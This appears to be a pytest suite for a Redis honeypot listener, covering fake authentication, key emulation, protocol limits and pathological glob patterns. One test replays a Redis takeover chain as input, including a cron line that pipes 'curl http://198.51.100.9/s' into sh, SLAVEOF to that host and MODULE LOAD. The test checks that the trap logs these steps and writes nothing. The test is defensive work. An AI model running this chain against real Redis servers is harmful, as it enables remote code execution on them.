"""Redis trap tests with a raw RESP client over loopback."""

from __future__ import annotations

import asyncio
import os
from typing import Optional

import pytest

from listeners import redis as redis_trap
from listeners.base import Limits, ListenerContext, ServiceSettings
from listeners.events import EventWriter
from scenarios.loader import LoadedScenario
from scenarios.schema import LoginPolicy, Scenario

SCENARIO = {
    "name": "unit_test", "title": "Unit", "description": "unit test scenario",
    "identity": {"org_name": "Example Bank", "hostname": "cache01", "domain": "example.test",
                 "internal_ips": ["10.0.0.9"], "os_pretty_name": "Ubuntu 22.04.4 LTS",
                 "kernel": "Linux cache01 5.15.0 #1 SMP x86_64 GNU/Linux"},
    "services": {"redis": {"enabled": True, "port": 0, "version": "6.2.14", "keys": [
        {"key": "session:9f1c", "value": "{\"uid\": 7}"},
        {"key": "user:7", "type": "hash", "value": {"name": "Avery Hartwell", "tier": "gold"}},
        {"key": "jobs", "type": "list", "value": ["a", "b", "c"]},
        {"key": "admins", "type": "set", "value": ["ops"]}]}},
}


def resp(*args: str) -> bytes:
    out = f"*{len(args)}\r\n".encode()
    for a in args:
        b = a.encode()
        out += b"$" + str(len(b)).encode() + b"\r\n" + b + b"\r\n"
    return out


async def read_reply(reader):
    line = await asyncio.wait_for(reader.readline(), 3)
    kind, body = line[:1], line[1:-2]
    if kind in (b"+", b"-"):
        return line[:-2].decode()
    if kind == b":":
        return int(body)
    if kind == b"$":
        n = int(body)
        if n < 0:
            return None
        return (await reader.readexactly(n + 2))[:-2].decode()
    if kind == b"*":
        return [await read_reply(reader) for _ in range(int(body))]
    return line


class Client:
    def __init__(self, reader, writer) -> None:
        self.reader, self.writer = reader, writer

    async def __call__(self, *args: str):
        self.writer.write(resp(*args))
        await self.writer.drain()
        return await read_reply(self.reader)


@pytest.fixture
async def redis_server():
    servers = []

    async def _start(accept="after_n", limits: Optional[Limits] = None, scenario=True):
        writer = EventWriter(None)
        loaded = LoadedScenario(scenario=Scenario.model_validate(SCENARIO), seed="t") if scenario else None
        ctx = ListenerContext(writer, limits=limits, bind_host="127.0.0.1", seed="test",
                              scenario=loaded)
        settings = ServiceSettings(name="redis", enabled=True, port=0, version="6.2.14",
                                   policy=LoginPolicy(accept=accept, after_n_min=2, after_n_max=2))
        ctx.settings["redis"] = settings
        objs = await redis_trap.start(ctx, settings)
        servers.extend(objs)
        port = objs[0].sockets[0].getsockname()[1]
        reader, w = await asyncio.open_connection("127.0.0.1", port)
        return writer, Client(reader, w), port

    yield _start
    for s in servers:
        s.close()


def events(writer, event):
    return [e for e in writer.events if e["event"] == event]


async def test_redis_noauth_wrongpass_then_auth_and_keyspace(redis_server):
    writer, c, _ = await redis_server()
    assert await c("PING") == "-NOAUTH Authentication required."
    assert await c("AUTH", "foobared") == \
        "-WRONGPASS invalid username-password pair or user is disabled."
    assert await c("AUTH", "default", "redis123") == "+OK"
    assert await c("PING") == "+PONG"
    assert sorted(await c("KEYS", "*")) == ["admins", "jobs", "session:9f1c", "user:7"]
    assert await c("GET", "session:9f1c") == '{"uid": 7}'
    assert await c("HGET", "user:7", "tier") == "gold"
    assert await c("HGETALL", "user:7") == ["name", "Avery Hartwell", "tier", "gold"]
    assert await c("LRANGE", "jobs", "0", "-1") == ["a", "b", "c"]
    assert await c("SMEMBERS", "admins") == ["ops"]
    assert await c("TYPE", "user:7") == "+hash"
    assert (await c("GET", "user:7")).startswith("-WRONGTYPE")
    assert await c("SET", "x", "1") == "+OK"
    assert await c("EXPIRE", "x", "100") == 1
    assert 0 < await c("TTL", "x") <= 100
    assert await c("TTL", "nope") == -2
    assert await c("DBSIZE") == 5
    assert await c("SCAN", "0", "MATCH", "user:*") == ["0", ["user:7"]]
    assert await c("DEL", "x", "nope") == 1
    assert "redis_version:6.2.14" in await c("INFO")
    assert await c("SELECT", "3") == "+OK" and await c("DBSIZE") == 0
    assert (await c("NOSUCH", "a")).startswith("-ERR unknown command 'NOSUCH'")
    assert await c("QUIT") == "+OK"
    attempts = events(writer, "auth_attempt")
    assert [(a["username"], a["password"], a["success"]) for a in attempts] == [
        ("default", "foobared", False), ("default", "redis123", True)]


async def test_redis_takeover_chain_logged_and_nothing_written(redis_server, tmp_path):
    writer, c, _ = await redis_server(accept="all")
    target = tmp_path / "cron"
    target.mkdir()
    before = set(os.listdir(tmp_path)) | set(os.listdir(target))
    assert await c("CONFIG", "SET", "dir", str(target)) == "+OK"
    assert await c("CONFIG", "SET", "dbfilename", "root") == "+OK"
    assert await c("CONFIG", "GET", "dir") == ["dir", str(target)]
    assert await c("SET", "x", "\n* * * * * curl http://198.51.100.9/s | sh\n") == "+OK"
    assert await c("SAVE") == "+OK"
    assert await c("BGSAVE") == "+Background saving started"
    assert await c("SLAVEOF", "198.51.100.9", "6379") == "+OK"
    assert (await c("MODULE", "LOAD", "/tmp/exp.so")).startswith("-ERR Error loading")
    assert await c("EVAL", "return redis.call('ping')", "0") is None
    assert await c("FLUSHALL") == "+OK"
    assert await c("DBSIZE") == 0
    assert set(os.listdir(tmp_path)) | set(os.listdir(target)) == before
    assert list(target.iterdir()) == []

    high = [e["data"]["input"] for e in events(writer, "command")
            if e["data"].get("high_signal") and e["data"].get("signal") == "redis_takeover"]
    assert any(h.startswith("CONFIG SET dir") for h in high)
    assert any(h.startswith("CONFIG SET dbfilename") for h in high)
    for cmd in ("SAVE", "BGSAVE", "SLAVEOF", "MODULE LOAD", "EVAL", "FLUSHALL"):
        assert any(h.startswith(cmd) for h in high), cmd
    assert not any(e["data"].get("high_signal") for e in events(writer, "command")
                   if e["data"]["input"].startswith("CONFIG GET"))


async def test_redis_config_set_is_per_connection(redis_server):
    writer, c, port = await redis_server(accept="all")
    assert await c("CONFIG", "SET", "dir", "/tmp") == "+OK"
    reader, w = await asyncio.open_connection("127.0.0.1", port)
    c2 = Client(reader, w)
    assert await c2("CONFIG", "GET", "dir") == ["dir", "/var/lib/redis"]
    w.close()


async def test_redis_inline_and_limits(redis_server):
    writer, c, port = await redis_server(accept="all", scenario=False)
    reader, w = await asyncio.open_connection("127.0.0.1", port)
    w.write(b'PING\r\nECHO "hello world"\r\n')
    await w.drain()
    assert await read_reply(reader) == "+PONG"
    assert await read_reply(reader) == "hello world"
    w.write(b"*999999\r\n")
    await w.drain()
    assert (await read_reply(reader)).startswith("-ERR Protocol error")
    assert await asyncio.wait_for(reader.read(10), 2) == b""
    w.close()
    w2 = c.writer
    w2.write(b"*1\r\n$99999999\r\n")
    await w2.drain()
    assert (await read_reply(c.reader)).startswith("-ERR Protocol error")
    reasons = {e["data"]["reason"] for e in events(writer, "limit")}
    assert {"max_array", "max_bulk"} <= reasons


async def test_redis_pathological_glob_patterns_are_fast(redis_server):
    import time as _time
    writer, c, _ = await redis_server(accept="all", limits=Limits(max_conn_bytes=8_000_000))
    for i in range(50):
        assert await c("SET", "a" * 200 + str(i), "1") == "+OK"
    small_evil = "a*" * 100 + "b"                # 201 bytes: under the cap, still nasty
    started = _time.monotonic()
    for tail in ("b", "c", "d"):                 # 400 KB patterns, each one distinct
        assert await c("KEYS", "a*" * 200_000 + tail) == []
    assert await c("SCAN", "0", "MATCH", "a*" * 200_000 + "e") == ["0", []]
    assert await c("CONFIG", "GET", "a*" * 200_000 + "f") == []
    assert await c("KEYS", small_evil) == []
    assert await c("SCAN", "0", "MATCH", small_evil) == ["0", []]
    assert await c("CONFIG", "GET", small_evil) == []
    assert _time.monotonic() - started < 1.0
    # Ordinary patterns keep working through the same matcher.
    assert await c("KEYS", "a*9") != []
    assert sorted(await c("KEYS", "[cq]*")) == ["cache:config", "queue:jobs"] or \
        sorted(await c("KEYS", "[sj]*")) == ["jobs", "session:9f1c"]
    assert await c("CONFIG", "GET", "db?ilename") == ["dbfilename", "dump.rdb"]
    assert await c("CONFIG", "GET", "MAXMEMORY") == ["maxmemory", "0"]


async def test_redis_long_pattern_capped_without_fnmatch(redis_server, monkeypatch):
    import fnmatch as _fnmatch

    def boom(*_a, **_k):
        raise AssertionError("fnmatch used on a client pattern")

    monkeypatch.setattr(_fnmatch, "fnmatchcase", boom)
    monkeypatch.setattr(_fnmatch, "fnmatch", boom)
    _, c, _ = await redis_server(accept="all")
    assert await c("KEYS", "a*" * 200_000) == []           # 400 KB pattern
    assert await c("KEYS", "*") != []
    assert await c("PING") == "+PONG"


async def test_redis_integer_arguments_out_of_range(redis_server):
    _, c, _ = await redis_server(accept="all")
    assert await c("SET", "k", "v", "EX", "9" * 30) == \
        "-ERR value is not an integer or out of range"
    assert await c("SET", "k", "v", "EX", "9223372036854775807") == \
        "-ERR invalid expire time in 'set' command"
    assert await c("SET", "k", "v", "EX", "0") == "-ERR invalid expire time in 'set' command"
    assert await c("SET", "k", "v", "PX", "-5") == "-ERR invalid expire time in 'set' command"
    assert await c("SET", "k", "v", "EX", "abc") == "-ERR value is not an integer or out of range"
    assert await c("SET", "k", "v", "EX") == "-ERR syntax error"
    assert await c("SET", "k", "v", "EX", "100") == "+OK"
    assert 0 < await c("TTL", "k") <= 100
    assert await c("EXPIRE", "k", "9223372036854775807") == \
        "-ERR invalid expire time in 'expire' command"
    assert await c("EXPIRE", "k", "1" + "0" * 400) == \
        "-ERR value is not an integer or out of range"
    assert await c("SELECT", "1" + "0" * 400) == "-ERR value is not an integer or out of range"
    assert await c("SCAN", "x") == "-ERR invalid cursor"
    assert await c("LRANGE", "jobs", "0", "9" * 400) == "-ERR value is not an integer or out of range"
    assert await c("SET", "n", "9223372036854775807") == "+OK"
    assert await c("INCR", "n") == "-ERR increment or decrement would overflow"
    assert await c("PING") == "+PONG"                      # connection still alive


async def test_redis_http_probe_gets_arity_error_then_silent_close(redis_server):
    writer, c, port = await redis_server(accept="all")
    reader, w = await asyncio.open_connection("127.0.0.1", port)
    w.write(b"GET / HTTP/1.1\r\nHost: 127.0.0.1:6379\r\nUser-Agent: curl/8.5.0\r\n\r\n")
    await w.drain()
    assert await read_reply(reader) == "-ERR wrong number of arguments for 'get' command"
    assert await asyncio.wait_for(reader.read(10), 2) == b""
    w.close()
    reader, w = await asyncio.open_connection("127.0.0.1", port)
    w.write(b"POST / HTTP/1.1\r\n")
    await w.drain()
    assert await asyncio.wait_for(reader.read(10), 2) == b""
    w.close()
    assert await c("GET", "session:9f1c") == '{"uid": 7}'
    cmds = [e["data"]["cmd"] for e in events(writer, "command")]
    assert "HOST:" in cmds and "POST" in cmds
